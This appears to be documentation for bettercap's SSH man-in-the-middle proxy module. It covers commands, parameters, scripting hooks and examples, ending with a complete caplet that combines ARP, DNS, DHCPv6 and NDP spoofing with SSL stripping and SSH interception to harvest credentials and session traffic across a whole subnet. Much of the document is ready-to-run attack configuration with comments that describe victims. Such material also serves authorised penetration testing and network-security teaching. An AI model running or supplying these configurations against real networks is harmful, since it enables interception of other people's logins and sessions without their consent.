---
title: ssh.proxy
description: A SSH MITM proxy that intercepts SSH connections, logs authentication credentials and all plaintext session traffic, and forwards transparently to the real destination.
---

A **SSH man-in-the-middle proxy** that transparently intercepts SSH connections.
It presents its own host key to the client, captures plaintext credentials (password and public-key authentication attempts), logs all session data (commands, output), and forwards traffic to the real SSH destination.

When used with a [spoofer](/modules/ethernet/spoofers/introduction/), all SSH traffic on the target port is redirected to this proxy automatically.
On Linux the original destination is resolved via `SO_ORIGINAL_DST`; on macOS via the `pf` state table.

## Commands

### `ssh.proxy on`

Start the SSH MITM proxy.

### `ssh.proxy off`

Stop the SSH MITM proxy.

## Parameters

| Parameter           | Default               | Description                                                                                                                               |
| ------------------- | --------------------- | ----------------------------------------------------------------------------------------------------------------------------------------- |
| `ssh.address`       |                       | Remote address to forward SSH connections to. Leave empty to auto-detect the original destination from the NAT table (Linux via `SO_ORIGINAL_DST`, macOS via `pf` state table). |
| `ssh.port`          | `22`                  | Remote SSH port to intercept.                                                                                                             |
| `ssh.proxy.address` | `<interface address>` | Address to bind the SSH proxy to.                                                                                                         |
| `ssh.proxy.port`    | `2222`                | Port to bind the SSH proxy to.                                                                                                            |
| `ssh.proxy.hostkey` |                       | Path to a PEM-encoded private key used as the proxy host key. If empty, an ephemeral ECDSA P-256 key is generated automatically.         |
| `ssh.proxy.script`  |                       | Path of a SSH proxy JS script.                                                                                                            |

## Scripting

The `ssh.proxy` module can be scripted using JavaScript files that may declare the following functions:

```js
// called when the script is loaded
function onLoad() {
  // ...
}

// called when data is available on an SSH channel
// sessionID: string like "1.2.3.4:12345->5.6.7.8:22[session]"
// direction: "client->server" or "server->client"
// data: ByteArray
// return: modified ByteArray, or null/undefined to keep original
function onSSHData(sessionID, direction, data) {
  log(sessionID + " " + direction + ": " + data.length + " bytes")
  // optionally modify and return the data buffer
  return data
}
```

## Builtin Functions

The JS interpreter is [limited to ES5](https://github.com/robertkrimen/otto?tab=readme-ov-file#caveat-emptor) (no for/of, typed arrays, classes... )

Scripts can use the following builtin functions.

| Function                                    | Description                                                                   |
| ------------------------------------------- | ----------------------------------------------------------------------------- |
| `readDir("/path/")`                         | Return the contents of a directory as a string array.                         |
| `readFile("/path/to/file")`                 | Return the contents of a file as a string.                                    |
| `writeFile("/path/to/file", "hello world")` | Write the string `hello world` to a file, returns `null` or an error message. |
| `log_debug("message")`                      | Log a message in the interactive session (its level will be `DEBUG`).         |
| `log_info("message")`                       | Log a message in the interactive session (its level will be `INFO`).          |
| `log_warn("message")`                       | Log a message in the interactive session (its level will be `WARNING`).       |
| `log_error("message")`                      | Log a message in the interactive session (its level will be `ERROR`).         |
| `log_fatal("message")`                      | Log a message in the interactive session (its level will be `FATAL`).         |
| `log("message")`                            | Shortcut for `log_info("message")`.                                           |
| `btoa("message")`                           | Encode a message to base64.                                                   |
| `atob("bWVzc2FnZQ==")`                      | Decode a message from base64.                                                 |
| `env("iface.ipv4")`                         | Read a variable.                                                              |
| `env("foo", "bar")`                         | Set a variable.                                                               |
| `run("command")`                            | Execute a shell command and return the output as a string.                    |
| `fileExists("/path/to/file")`               | Return `true` if the file exists, otherwise `false`.                          |
| `loadJSON("/path/to/file.json")`            | Load and parse a JSON file, returns a JS object.                              |
| `saveJSON("/path/to/file.json", object)`    | Serialize and save a JS object as JSON to the specified file.                 |
| `saveToFile("/path.txt", "data")`           | Save raw string data to a file.                                               |
| `onEvent("event.tag", callback)`            | Register a JS callback for the given session event tag.                       |
| `removeEventListener("event.tag")`          | Remove a previously registered event listener for the given tag.              |
| `addSessionEvent("tag", data)`              | Trigger a session event from within the script with a custom tag and payload. |

## Examples

### Quick start — intercept all SSH traffic on the LAN

Enable full-duplex ARP spoofing and start the proxy. The original destination is resolved automatically per connection (Linux via `SO_ORIGINAL_DST`, macOS via `pf` state table):

```bash
set arp.spoof.fullduplex true

set ssh.port       22
set ssh.proxy.port 2222

ssh.proxy on
arp.spoof on
```

### Quick start — intercept SSH to a single host

```bash
set ssh.address    192.168.1.10
set ssh.port       22
set ssh.proxy.port 2222

ssh.proxy on
arp.spoof on
```

### Full MITM caplet (`sshproxy.cap`)

The `sshproxy.cap` caplet shipped with bettercap activates every available spoofer and proxy together for comprehensive network interception on both IPv4 and IPv6 with SSH MITM.

**Usage:**

```bash
sudo bettercap -caplet sshproxy.cap
# override the target subnet:
sudo bettercap -caplet sshproxy.cap -eval "set arp.spoof.targets 192.168.1.0/24"
```

> **Note:** Run as root. On Linux all features work. On macOS `packet.proxy` is unavailable and NDP/DHCPv6 have limited support.

```bash
# sshproxy.cap — Comprehensive MITM caplet
#
# Activates every available spoofer and proxy to perform
# full network interception on both IPv4 and IPv6 with SSH MITM.

# ===========================================================
# 1. NETWORK DISCOVERY
#    net.recon reads the ARP cache; net.probe actively sends
#    UDP probes (NBNS, mDNS, UPnP, WSD) to find every host.
# ===========================================================
set net.probe.nbns     true
set net.probe.mdns     true
set net.probe.upnp     true
set net.probe.wsd      true
set net.probe.throttle 10

net.recon on
net.probe on

# ===========================================================
# 2. CREDENTIAL SNIFFER
#    Passive sniffing for cleartext credentials (HTTP, FTP,
#    NTLM, Kerberos, etc.) flowing through us.
# ===========================================================
set net.sniff.verbose false
set net.sniff.local   false
net.sniff on

# ===========================================================
# 3. ARP SPOOFING (IPv4)
#    Full-duplex: poison both victim AND gateway ARP caches.
#    Targets the entire subnet by default; override with:
#      set arp.spoof.targets 192.168.1.50,192.168.1.51
# ===========================================================
set arp.spoof.fullduplex true
set arp.spoof.internal   true

# ===========================================================
# 4. DNS SPOOFING
#    Respond to DNS queries with our address. By default
#    answers all queries (dns.spoof.all true). Set specific
#    domains with dns.spoof.domains if you want targeted use.
# ===========================================================
set dns.spoof.all true
set dns.spoof.ttl 1024

# ===========================================================
# 5. DHCPv6 SPOOFING (IPv6)
#    Reply to DHCPv6 solicitations to inject ourselves as
#    the DNS server for IPv6 clients (mitm6-style attack).
# ===========================================================
set dhcp6.spoof.domains microsoft.com, google.com, facebook.com, apple.com, twitter.com, github.com

# ===========================================================
# 6. NDP SPOOFING (IPv6)
#    Send spoofed Neighbor Advertisements and Router
#    Advertisements on IPv6 networks. Set ndp.spoof.targets
#    for specific victims, or leave empty for RA-only attack.
# ===========================================================
set ndp.spoof.prefix          d00d::
set ndp.spoof.prefix.length   64
set ndp.spoof.router_lifetime 10

# ===========================================================
# 7. HTTP PROXY with SSL STRIP
#    Intercept HTTP traffic and attempt to downgrade HTTPS
#    links to HTTP (sslstrip). JS injection is available via
#    http.proxy.injectjs if needed.
# ===========================================================
set http.proxy.sslstrip true

# ===========================================================
# 8. HTTPS PROXY
#    Intercept HTTPS traffic with on-the-fly certificate
#    generation. Victims will see certificate warnings unless
#    you install the CA cert on their machines.
# ===========================================================
set https.proxy.sslstrip true

# ===========================================================
# 9. SSH MITM PROXY
#    Intercept all SSH (port 22) traffic. The proxy presents
#    its own host key, captures plaintext credentials, and
#    logs all session data (commands, output) to stdout.
#    On Linux the original destination is auto-detected via
#    SO_ORIGINAL_DST; on macOS via pf state table lookup.
# ===========================================================
# ssh.address is left empty — auto-detect destination per connection
set ssh.port       22
set ssh.proxy.port 2222

# ===========================================================
# 10. ACTIVATE EVERYTHING
#     Order matters: start proxies first so the firewall
#     redirections are in place before spoofers push traffic
#     through us.
# ===========================================================
http.proxy  on
https.proxy on
ssh.proxy   on

arp.spoof   on
dns.spoof   on
dhcp6.spoof on
ndp.spoof   on

# The event stream is auto-started and will print all
# captured credentials, SSH session logs, and module events
# to stdout in real-time.
```
